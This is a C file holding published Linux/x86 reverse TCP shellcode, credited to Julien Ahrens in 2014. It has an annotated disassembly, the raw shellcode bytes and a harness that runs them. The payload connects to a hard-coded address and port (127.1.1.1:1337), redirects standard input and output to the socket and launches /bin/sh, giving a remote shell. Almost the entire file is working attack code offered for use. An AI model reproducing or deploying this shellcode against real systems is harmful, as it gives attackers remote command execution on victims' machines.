/*
*  Title:    Shell Reverse TCP Shellcode - 74 bytes
*  Platform: Linux/x86
*  Date:     2014-07-25
*  Author:   Julien Ahrens (@MrTuxracer)
*  Website:  http://www.rcesecurity.com
*
* Disassembly of section .text:
*  00000000 <_start>:
*  0:   6a 66                push   0x66
*  2:   58                   pop    eax
*  3:   6a 01                push   0x1
*  5:   5b                   pop    ebx
*  6:   31 d2                xor    edx,edx
*  8:   52                   push   edx
*  9:   53                   push   ebx
*  a:   6a 02                push   0x2
*  c:   89 e1                mov    ecx,esp
*  e:   cd 80                int    0x80
* 10:   92                   xchg   edx,eax
* 11:   b0 66                mov    al,0x66
* 13:   68 7f 01 01 01       push   0x101017f <ip: 127.1.1.1
* 18:   66 68 05 39          pushw  0x3905 <port: 1337
* 1c:   43                   inc    ebx
* 1d:   66 53                push   bx
* 1f:   89 e1                mov    ecx,esp
* 21:   6a 10                push   0x10
* 23:   51                   push   ecx
* 24:   52                   push   edx
* 25:   89 e1                mov    ecx,esp
* 27:   43                   inc    ebx
* 28:   cd 80                int    0x80
* 2a:   6a 02                push   0x2
* 2c:   59                   pop    ecx
* 2d:   87 da                xchg   edx,ebx
*
* 0000002f <loop>:
* 2f:   b0 3f                mov    al,0x3f
* 31:   cd 80                int    0x80
* 33:   49                   dec    ecx
* 34:   79 f9                jns    2f <loop>
* 36:   b0 0b                mov    al,0xb
* 38:   41                   inc    ecx
* 39:   89 ca                mov    edx,ecx
* 3b:   52                   push   edx
* 3c:   68 2f 2f 73 68       push   0x68732f2f
* 41:   68 2f 62 69 6e       push   0x6e69622f
* 46:   89 e3                mov    ebx,esp
* 48:   cd 80                int    0x80
*/

#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
int (*ret)() = (int(*)())shellcode;
ret();
}